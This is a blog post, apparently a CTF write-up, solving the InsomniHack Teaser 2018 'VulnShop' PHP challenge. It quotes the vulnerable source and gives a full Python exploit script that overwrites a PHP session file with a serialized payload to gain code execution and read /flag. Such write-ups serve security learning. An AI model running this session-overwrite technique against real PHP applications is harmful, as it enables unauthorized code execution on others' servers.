<!DOCTYPE html>
<html lang="en">

  <!-- Head -->
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    <!-- Metadata, OpenGraph and Schema.org -->
    

    <!-- Standard metadata -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Remote Code Execution via Session - InsomniHack Teaser 2018 | Gokul Krishna</title>
    <meta name="author" content="Gokulkrishna P. Menon">
    <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
">
    <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website">


    <!-- Bootstrap & MDB -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous">

    <!-- Fonts & Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons">

    <!-- Code Syntax Highlighting -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light">

    <!-- Styles -->
    
    <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;">
    
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="canonical" href="https://g0kkk.github.io/blog/2018/Insomni-Hack-2018-Web-VulnShop/">
    
    <!-- Dark Mode -->
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark">

    <script src="/assets/js/theme.js"></script>
    <script src="/assets/js/dark_mode.js"></script>
    

  </head>

  <!-- Body -->
  <body class="fixed-top-nav ">

    <!-- Header -->
    <header>

      <!-- Nav Bar -->
      <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top">
        <div class="container">
          <a class="navbar-brand title font-weight-lighter" href="/">Gokul Krishna</a>
          <!-- Navbar Toggle -->
          <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar top-bar"></span>
            <span class="icon-bar middle-bar"></span>
            <span class="icon-bar bottom-bar"></span>
          </button>

          <div class="collapse navbar-collapse text-right" id="navbarNav">
            <ul class="navbar-nav ml-auto flex-nowrap">

              <!-- About -->
              <li class="nav-item ">
                <a class="nav-link" href="/">about</a>
              </li>
              
              <!-- Blog -->
              <li class="nav-item active">
                <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a>
              </li>

              <!-- Other pages -->
              <li class="nav-item ">
                <a class="nav-link" href="/publications/">publications</a>
              </li>
              <li class="nav-item ">
                <a class="nav-link" href="/projects/">projects</a>
              </li>
              <li class="nav-item ">
                <a class="nav-link" href="/repositories/">repositories</a>
              </li>
              <li class="nav-item ">
                <a class="nav-link" href="/cv/">cv</a>
              </li>
              <li class="nav-item ">
                <a class="nav-link" href="/teaching/">teaching</a>
              </li>
              <li class="nav-item dropdown ">
                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a>
                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/publications/">publications</a>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item" href="/projects/">projects</a>
                </div>
              </li>

              <!-- Toogle theme mode -->
              <li class="toggle-container">
                <button id="light-toggle" title="Change theme">
                  <i class="fas fa-moon"></i>
                  <i class="fas fa-sun"></i>
                </button>
              </li>
            </ul>
          </div>
        </div>
      </nav>

      <!-- Scrolling Progress Bar -->
      <progress id="progress" value="0">
        <div class="progress-container">
          <span class="progress-bar"></span>
        </div>
      </progress>
    </header>


    <!-- Content -->
    <div class="container mt-5">
      <!-- _layouts/post.html -->

<div class="post">

  <header class="post-header">
    <h1 class="post-title">Remote Code Execution via Session - InsomniHack Teaser 2018</h1>
    <p class="post-meta">January 21, 2018</p>
    <p class="post-tags">
      <a href="/blog/2018"> <i class="fas fa-calendar fa-sm"></i> 2018 </a>
        ·  
        <a href="/blog/tag/web-ctf-php-rce">
          <i class="fas fa-hashtag fa-sm"></i> Web, CTF, PHP-RCE</a>  
          

    </p>
  </header>

  <article class="post-content">
    <p>This year’s Insomni’Hack had pretty much decent challenges even though it took some time before my team could solve. The first challenge being, <code class="language-plaintext highlighter-rouge">VulnShop</code>. A pretty straightforward description with a few functionalities in the page along with the source code made it neat and clean.</p>

<figure class="foto-legenda">
	<img src="../assets/writeup2/firstpage" alt="">
</figure>

<p>Going through the source code, two particular function caught my attention: <code class="language-plaintext highlighter-rouge">captcha</code> and <code class="language-plaintext highlighter-rouge">captcha-verify</code>.</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">case</span> <span class="s1">'contactus'</span><span class="o">:</span>
  <span class="k">echo</span> <span class="s2">"&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"</span><span class="p">;</span>
  <span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">100000</span><span class="p">,</span><span class="mi">999999</span><span class="p">);</span>
  <span class="k">break</span><span class="p">;</span>
<span class="k">case</span> <span class="s1">'captcha'</span><span class="o">:</span>
  <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]))</span> <span class="k">echo</span> <span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">];</span>
  <span class="c1">// Will make an image later</span>
    <span class="nb">touch</span><span class="p">(</span><span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]);</span>
    <span class="k">break</span><span class="p">;</span>
<span class="k">case</span> <span class="s1">'captcha-verify'</span><span class="o">:</span>
<span class="c1">// verification functions take a file for later, when we'll provide more way of verification</span>
  <span class="k">function</span> <span class="n">verifyFromString</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$response</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$response</span><span class="p">)</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="k">else</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
 <span class="p">}</span>  </code></pre></figure>

<p>The <code class="language-plaintext highlighter-rouge">$_SESSION['challenge']</code> does something very interesting which is basically creating a file after calling the <code class="language-plaintext highlighter-rouge">contactus</code> page
which basically stores a random number between the specified value and in return requesting for <code class="language-plaintext highlighter-rouge">captcha</code> creates a file with the same generated number.</p>

<figure class="foto-legenda">
	<img src="../assets/writeup2/filecreation" alt="">
</figure>

<p>Let that be pretty much and let’s move ahead in the source code. The very next piece of code,</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'answer'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])){</span>
    <span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">](</span><span class="s2">"./"</span><span class="mf">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">],</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'answer'</span><span class="p">]);</span>
<span class="p">}</span></code></pre></figure>

<p>we can see how the request is made, mainly two parameters as <code class="language-plaintext highlighter-rouge">GET</code> request.</p>

<p>The next part is the main aim of getting the flag. So according to the description and what we understood from the source code, what we can do is, we will make it into 3 steps:
1) Create a file by calling <code class="language-plaintext highlighter-rouge">contactus</code> and <code class="language-plaintext highlighter-rouge">captcha</code>
2) Write whatever we want to the file, say <code class="language-plaintext highlighter-rouge">123456</code>
3) Copy the contents of that particular file to the session variable
4) Execute it</p>

<p>Also there were a few function which were disabled that could be seen in <code class="language-plaintext highlighter-rouge">phpinfo</code>:</p>

<figure class="foto-legenda">
	<img src="../assets/writeup2/disabled_func" alt="">
</figure>

<p>The script below does all in one go:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#Author gkrishna
#Member of Teambi0s
#insomnihack_teaser 2018
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://vulnshop.teaser.insomnihack.ch/"</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=contactus"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=captcha"</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'?page=captcha-verify&amp;method=file_put_contents&amp;answer=challenge|s:35:"print_r(file_get_contents(</span><span class="se">\'</span><span class="s">/flag</span><span class="se">\'</span><span class="s">))";'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="s">'PHPSESSID'</span><span class="p">]</span>
<span class="n">val</span> <span class="o">=</span> <span class="s">"Value of Cookie = "</span> <span class="o">+</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="s">'PHPSESSID'</span><span class="p">]</span>

<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=captcha-verify&amp;method=rename&amp;answer=/var/lib/php/sessions/sess_"</span><span class="o">+</span><span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="s">'PHPSESSID'</span><span class="p">])</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=captcha-verify&amp;method=verifyFromMath&amp;answer=1"</span><span class="p">)</span>

<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span></code></pre></figure>

<p>Towards the end, we call the function <code class="language-plaintext highlighter-rouge">verifyFromMath</code> which returns the desired string.</p>

<p>Catch me in <a href="https://twitter.com/gkgkrishna33" rel="external nofollow noopener" target="_blank">Twitter</a>.</p>

  </article>


  
    
    <br>
    <hr>
    <br>
    <ul class="list-disc pl-8"></ul>

    <!-- Adds related posts to the end of an article -->
    <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2>
    <p class="mb-2">Here are some more articles you might like to read next:</p>
  

  <li class="my-2">
    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2019/CONFidence-CTF-admin-panel/">CONFidence CTF 2019 'The Admin Panel' Writeup</a>
  </li>

  

  <li class="my-2">
    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2019/iCTF-2019-Echodoor/">iCTF 2019 Echodoor</a>
  </li>

  

  <li class="my-2">
    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/SECT-2018-EzDOS/">SECT 2018 EzDOS Reversing Challenge</a>
  </li>

  

  <li class="my-2">
    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/ASIS-CTF-Quals-2018-Good-WAF/">ASIS Quals 2018 Good WAF</a>
  </li>

  

  <li class="my-2">
    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/MacOS-Malware/">Search Page Injection Malware on MacOS </a>
  </li>

</div>

    </div>

    <!-- Footer -->    
    <footer class="fixed-bottom">
      <div class="container mt-0">
        © Copyright 2023 Gokulkrishna P. Menon. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>.

      </div>
    </footer>

    <!-- JavaScripts -->
    <!-- jQuery -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>

    <!-- Bootsrap & MDB scripts -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script>

    <!-- Masonry & imagesLoaded -->
  <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script>
  <script defer src="/assets/js/masonry.js" type="text/javascript"></script>
    
  <!-- Medium Zoom JS -->
  <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
  <script defer src="/assets/js/zoom.js"></script><!-- Load Common JS -->
  <script defer src="/assets/js/common.js"></script>
  <script defer src="/assets/js/copy_code.js" type="text/javascript"></script>

    
  <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script>
  <script async src="https://badge.dimensions.ai/badge.js"></script>

    <!-- MathJax -->
  <script type="text/javascript">
    window.MathJax = {
      tex: {
        tags: 'ams'
      }
    };
  </script>
  <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script>
  <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>

    
    

<!-- Scrolling Progress Bar -->
<script type="text/javascript">
  /*
   * This JavaScript code has been adapted from the article 
   * https://css-tricks.com/reading-position-indicator/ authored by Pankaj Parashar, 
   * published on the website https://css-tricks.com on the 7th of May, 2014.
   * Couple of changes were made to the original code to make it compatible 
   * with the `al-foio` theme.
   */
  const progressBar = $("#progress");
  /*
   * We set up the bar after all elements are done loading.
   * In some cases, if the images in the page are larger than the intended
   * size they'll have on the page, they'll be resized via CSS to accomodate
   * the desired size. This mistake, however, breaks the computations as the
   * scroll size is computed as soon as the elements finish loading.
   * To account for this, a minimal delay was introduced before computing the
   * values.
   */
  window.onload = function () {
    setTimeout(progressBarSetup, 50);
  };
  /*
   * We set up the bar according to the browser.
   * If the browser supports the progress element we use that.
   * Otherwise, we resize the bar thru CSS styling
   */
  function progressBarSetup() {
    if ("max" in document.createElement("progress")) {
      initializeProgressElement();
      $(document).on("scroll", function() {
        progressBar.attr({ value: getCurrentScrollPosition() });
      });
      $(window).on("resize", initializeProgressElement);
    } else {
      resizeProgressBar();
      $(document).on("scroll", resizeProgressBar);
      $(window).on("resize", resizeProgressBar);
    }
  }
  /*
   * The vertical scroll position is the same as the number of pixels that
   * are hidden from view above the scrollable area. Thus, a value > 0 is
   * how much the user has scrolled from the top
   */
  function getCurrentScrollPosition() {
    return $(window).scrollTop();
  }

  function initializeProgressElement() {
    let navbarHeight = $("#navbar").outerHeight(true);
    $("body").css({ "padding-top": navbarHeight });
    $("progress-container").css({ "padding-top": navbarHeight });
    progressBar.css({ top: navbarHeight });
    progressBar.attr({
      max: getDistanceToScroll(),
      value: getCurrentScrollPosition(),
    });
  }
  /*
   * The offset between the html document height and the browser viewport
   * height will be greater than zero if vertical scroll is possible.
   * This is the distance the user can scroll
   */
  function getDistanceToScroll() {
    return $(document).height() - $(window).height();
  }

  function resizeProgressBar() {
    progressBar.css({ width: getWidthPercentage() + "%" });
  }
  // The scroll ratio equals the percentage to resize the bar
  function getWidthPercentage() {
    return (getCurrentScrollPosition() / getDistanceToScroll()) * 100;
  }
</script>

  </body>
</html>
